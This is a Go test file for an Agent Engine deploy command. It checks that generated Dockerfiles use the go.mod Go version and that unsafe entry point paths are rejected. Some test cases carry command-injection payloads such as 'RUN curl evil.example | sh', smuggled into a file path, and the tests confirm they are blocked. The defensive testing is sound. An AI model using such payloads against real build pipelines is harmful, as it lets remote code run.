// Copyright 2025 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package agentengine

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestGoVersionFromModFile(t *testing.T) {
	tests := []struct {
		name string
		mod  string
		want string
	}{
		{"patch version", "module x\n\ngo 1.26.5\n", "1.26.5"},
		{"minor version", "module x\n\ngo 1.26\n", "1.26"},
		{
			name: "ignores require block modules",
			mod:  "module x\n\ngo 1.26.5\n\nrequire (\n\tgoogle.golang.org/adk/v2 v2.1.0\n)\n",
			want: "1.26.5",
		},
		{
			name: "ignores toolchain line",
			mod:  "module x\n\ngo 1.26.5\n\ntoolchain go1.26.5\n",
			want: "1.26.5",
		},
		{"no go directive", "module x\n", ""},
		{"strips trailing line comment", "module x\n\ngo 1.26.5 // pinned by platform team\n", "1.26.5"},
		{"rejects malformed version", "module x\n\ngo 1abc\n", ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := goVersionFromModFile([]byte(tt.mod)); got != tt.want {
				t.Errorf("goVersionFromModFile() = %q, want %q", got, tt.want)
			}
		})
	}
}

// TestPrepareDockerfile_UsesGoModVersion guards that the generated builder image
// tracks the application's go.mod Go version instead of a hardcoded tag, so a
// managed Agent Engine build uses a toolchain that can actually compile the app.
//
// It is also the only test in this package that drives prepareDockerfile from a
// receiver that is not the package global, which is what makes the EXPOSE and
// RUN assertions below load-bearing: everywhere else the receiver and the global
// are the same struct, so a value read off the global still emits the right
// bytes.
func TestPrepareDockerfile_UsesGoModVersion(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "go.mod"),
		[]byte("module example.com/agent\n\ngo 1.26.5\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	dockerfile := filepath.Join(dir, "Dockerfile")

	// The global holds a different value for every field asserted below, so a
	// read of flags rather than the receiver emits someone else's bytes rather
	// than empty ones. The assertions fail either way, but this way they fail
	// for the reason they name, and without depending on no other test in the
	// file having left a value behind.
	resetFlags(t, "other.go")
	flags.source.origEntryPointPath = "./other.go"
	flags.build.execFile = "other"
	flags.agentEngine.serverPort = 8080

	f := &deployAgentEngineFlags{}
	f.source.sourceDir = dir
	f.source.origEntryPointPath = "./main.go"
	f.build.execFile = "agent"
	f.build.dockerfileBuildPath = dockerfile
	// Deliberately not the 8080 default, and deliberately never written to the
	// package global: a prepareDockerfile that read serverPort off the global
	// would emit "EXPOSE 0" here.
	f.agentEngine.serverPort = 9091

	if err := f.prepareDockerfile(); err != nil {
		t.Fatalf("prepareDockerfile() error = %v", err)
	}
	content, err := os.ReadFile(dockerfile)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(content), "FROM golang:1.26.5 AS builder") {
		t.Errorf("Dockerfile does not use the go.mod Go version:\n%s", content)
	}
	if strings.Contains(string(content), "golang:1.25") {
		t.Errorf("Dockerfile still hardcodes golang:1.25:\n%s", content)
	}
	if !strings.Contains(string(content), "ENV GOTOOLCHAIN=auto") {
		t.Errorf("Dockerfile is missing the GOTOOLCHAIN=auto safety net:\n%s", content)
	}
	if !strings.Contains(string(content), "\nEXPOSE 9091\n") {
		t.Errorf("Dockerfile does not EXPOSE the receiver's server port:\n%s", content)
	}
	// execFile and origEntryPointPath are the two values the strict allow-list
	// exists for in this package: they are the operands of the shell-form RUN
	// line. TestPrepareDockerfile_EntryPointReachesRUNLine reads that line too,
	// but it drives the global, so it cannot tell a receiver read from a global
	// one. This can.
	if !strings.Contains(string(content), "-o agent ./main.go\n") {
		t.Errorf("RUN line does not build the receiver's execFile from its entry point:\n%s", content)
	}
	if !strings.Contains(string(content), "\nCOPY --from=builder /app/agent  /app/agent\n") {
		t.Errorf("Dockerfile does not COPY the receiver's execFile out of the builder:\n%s", content)
	}
	if !strings.Contains(string(content), `["/app/agent", "web"`) {
		t.Errorf("Dockerfile CMD does not run the receiver's execFile:\n%s", content)
	}
}

// TestDefaultBuilderGoVersionIsNotPinned guards that the last-resort tag stays a
// rolling tag. A pinned version here would silently rot exactly like the
// hardcoded tag this change removed, so it must never be reintroduced.
func TestDefaultBuilderGoVersionIsNotPinned(t *testing.T) {
	if isGoVersion(defaultBuilderGoVersion) {
		t.Errorf("defaultBuilderGoVersion = %q pins a version; use a rolling tag such as %q",
			defaultBuilderGoVersion, "latest")
	}
}

// resetFlags points the package-level flags var at a fresh, minimally valid
// state for the duration of one test, restoring the previous value afterwards.
// computeFlags reads and writes that global directly, so without the restore
// one test's leftovers (an absolutised entryPointPath, a consumed tempDir)
// would be the next test's starting state.
//
// The state installed here is the zero value plus the two fields computeFlags
// needs, so a test that depends on a flag default (serverPort, which cobra
// registers as 8080) sets it itself rather than inheriting it.
func resetFlags(t *testing.T, entryPointPath string) {
	t.Helper()
	saved := flags
	t.Cleanup(func() { flags = saved })

	flags = deployAgentEngineFlags{}
	flags.source.entryPointPath = entryPointPath
	flags.build.tempDir = t.TempDir()
}

// allowListRejection is the part of the ValidateShellArgSafe rejection message
// that no other validator produces. The tests below match on it rather than on
// the label, because "entry point" is also a substring of the pre-existing
// StripExtension wrapper ("cannot strip '.go' extension from entry point path
// '%v'"): a payload edited to drop the .go extension would then satisfy a
// label-only assertion while saying nothing about the allow-list. It names the
// two reasons rather than the rejection itself, because the shorter sentence
// ("not allowed in a value embedded in generated Dockerfile content") is in
// ValidateDockerfileSafe's message too, and matching that would let a value
// that reaches the RUN line be downgraded to the weaker check unnoticed.
const allowListRejection = "whitespace splits COPY operands and shell metacharacters are live in a RUN line"

func TestComputeFlags_RejectsUnsafeEntryPointBasename(t *testing.T) {
	// The basename (with .go stripped) becomes f.build.execFile, embedded
	// directly into the generated Dockerfile's RUN/COPY/CMD lines. The benign
	// directory component is what makes the assertions below able to tell the
	// derived executable name apart from the raw flag value: without it the
	// two strings are byte-identical.
	maliciousEntryPoint := "cmd/quickstart/main\"\nRUN curl evil.example | sh\n#.go"
	resetFlags(t, maliciousEntryPoint)

	err := flags.computeFlags()
	if err == nil {
		t.Fatal("computeFlags() = nil, want an error rejecting the unsafe entry point basename")
	}
	if !strings.Contains(err.Error(), allowListRejection) {
		t.Errorf("computeFlags() error = %v, want the allow-list rejection %q", err, allowListRejection)
	}
	// The checked value is derived, so the message has to carry the flag and the
	// value as typed for the user to be able to find it in their command line.
	if want := fmt.Sprintf("derived from --entry_point_path %q", maliciousEntryPoint); !strings.Contains(err.Error(), want) {
		t.Errorf("computeFlags() error = %v, want it to contain %s", err, want)
	}
}

// TestComputeFlags_RejectsUnsafeOrigEntryPointPath covers the raw
// --entry_point_path value, captured before any path processing. execFile, by
// contrast, is derived only from the basename of that path, so a malicious
// directory component does not affect it. Both payloads keep the basename clean
// ("main.go", so the ".go"-extension strip and the execFile check both succeed)
// while the directory component carries shell metacharacters straight into the
// Dockerfile's `RUN ... -o execFile origEntryPointPath` line.
func TestComputeFlags_RejectsUnsafeOrigEntryPointPath(t *testing.T) {
	for name, maliciousEntryPoint := range map[string]string{
		"metacharacters in a directory component": "a;curl evil.example|sh#/main.go",
		// The second payload is the reason the check has to read the value as
		// typed rather than any processed form of it. filepath.Abs cleans the
		// ".." away, so f.source.srcBasePath no longer contains the "a;b"
		// component, while the RUN line is still emitted from the raw value and
		// still gets the ';'. A check moved onto srcBasePath accepts this.
		"metacharacters cleaned out of the processed path": "./a;b/../main.go",
	} {
		t.Run(name, func(t *testing.T) {
			resetFlags(t, maliciousEntryPoint)

			err := flags.computeFlags()
			if err == nil {
				t.Fatal("computeFlags() = nil, want an error rejecting the unsafe --entry_point_path value")
			}
			if !strings.Contains(err.Error(), allowListRejection) {
				t.Errorf("computeFlags() error = %v, want the allow-list rejection %q", err, allowListRejection)
			}
			// On the value as typed: pinning the label alone would leave the
			// check free to move onto a processed form of the path under an
			// unchanged message.
			if want := fmt.Sprintf("--entry_point_path %q", maliciousEntryPoint); !strings.Contains(err.Error(), want) {
				t.Errorf("computeFlags() error = %v, want the raw-value check to fire and report %s", err, want)
			}
			// And that it is the raw-flag check rather than the
			// derived-executable-name one above it. That one's label embeds the
			// raw flag value too ("executable name derived from
			// --entry_point_path %q:"), so the assertion above matches either
			// message and cannot tell the two checks apart on its own.
			if strings.Contains(err.Error(), "derived from") {
				t.Errorf("computeFlags() error = %v, want the raw --entry_point_path check to fire, not the derived executable name one", err)
			}
		})
	}
}

func TestComputeFlags_AcceptsBenignValues(t *testing.T) {
	resetFlags(t, "main.go")

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error for benign values", err)
	}
	if flags.build.execFile != "main" {
		t.Errorf("execFile = %q, want %q", flags.build.execFile, "main")
	}
	// Deriving execFile above os.MkdirTemp is what keeps a rejected invocation
	// from leaving a temp dir behind, and it leaves the paths that resolve
	// against the created directory as the only thing below it. Nothing in this
	// package reads execPath, since the build runs in the builder stage rather
	// than on the host, so the two that have to land inside the temp dir are
	// the ones createArchive writes and tars.
	for name, p := range map[string]string{
		"dockerfileBuildPath": flags.build.dockerfileBuildPath,
		"archivePath":         flags.build.archivePath,
	} {
		if !strings.HasPrefix(p, flags.build.tempDir+"/") {
			t.Errorf("%s = %q, want it inside the created temp dir %q", name, p, flags.build.tempDir)
		}
	}
}

// TestComputeFlags_AcceptsNonASCIIEntryPoint guards the deliberate decision to
// let the shell-arg allowlist admit non-ASCII runes. Every byte of a multi-byte
// UTF-8 rune is >= 0x80 and every shell metacharacter is ASCII, so admitting
// them costs nothing in safety, while rejecting them would fail deploys whose
// --entry_point_path merely passes through a non-ASCII directory name.
func TestComputeFlags_AcceptsNonASCIIEntryPoint(t *testing.T) {
	resetFlags(t, "agentes/café/agenté.go")

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error for a non-ASCII entry point path", err)
	}
	if flags.build.execFile != "agenté" {
		t.Errorf("execFile = %q, want %q", flags.build.execFile, "agenté")
	}
}

// TestComputeFlags_RejectionLeavesNoTempDir pins the ordering of every check
// that can fail against os.MkdirTemp. cleanTemp only runs after a fully
// successful deploy, there is no defer, so a check that fires after the temp
// dir is created leaves an empty agentEngine_<timestamp>_* directory behind on
// every rejected invocation. Nothing above os.MkdirTemp needs the directory;
// the fields that do (execPath, dockerfileBuildPath, archivePath) are all
// assigned below it.
//
// The third case is the one main leaks on today: StripExtension moved above
// os.MkdirTemp with the two validators, and an entry point path with no ".go"
// suffix is the only way to reach it.
func TestComputeFlags_RejectionLeavesNoTempDir(t *testing.T) {
	for name, entryPoint := range map[string]string{
		"unsafe basename":  "main\"\nRUN curl evil.example | sh\n#.go",
		"unsafe directory": "a;curl evil.example|sh#/main.go",
		"no .go extension": "main",
	} {
		t.Run(name, func(t *testing.T) {
			resetFlags(t, entryPoint)
			parent := flags.build.tempDir

			if err := flags.computeFlags(); err == nil {
				t.Fatal("computeFlags() = nil, want an error")
			}
			entries, err := os.ReadDir(parent)
			if err != nil {
				t.Fatalf("cannot read the temp dir parent: %v", err)
			}
			for _, e := range entries {
				t.Errorf("rejected invocation left %q behind in the temp dir parent", e.Name())
			}
		})
	}
}

// TestPrepareDockerfile_EntryPointReachesRUNLine pins the reason
// origEntryPointPath exists at all, and the reason it takes the stronger
// validator: it is the raw --entry_point_path value, not the absolutised one,
// that lands in the builder stage's RUN line. That stage's build context is
// rooted at /app by `COPY . .`, so a host-absolute path there fails every
// deploy. Without this the emitted line is only connected to the field by
// reading the code: moving the capture below the filepath.Abs assignment
// leaves the rest of the suite green. cloudrun ships the symmetric test for
// its CMD array.
func TestPrepareDockerfile_EntryPointReachesRUNLine(t *testing.T) {
	const entryPoint = "cmd/quickstart/main.go"
	resetFlags(t, entryPoint)
	flags.agentEngine.serverPort = 8080

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error", err)
	}
	if err := flags.prepareDockerfile(); err != nil {
		t.Fatalf("prepareDockerfile() = %v, want no error", err)
	}

	content, err := os.ReadFile(flags.build.dockerfileBuildPath)
	if err != nil {
		t.Fatalf("cannot read the generated Dockerfile: %v", err)
	}
	var runLine string
	for _, line := range strings.Split(string(content), "\n") {
		if rest, ok := strings.CutPrefix(line, "RUN "); ok {
			runLine = rest
		}
	}
	if runLine == "" {
		t.Fatalf("no RUN instruction in the generated Dockerfile:\n%s", content)
	}

	want := "-o " + flags.build.execFile + " " + entryPoint
	if !strings.HasSuffix(runLine, want) {
		t.Errorf("RUN line = %q, want it to end with %q", runLine, want)
	}
}
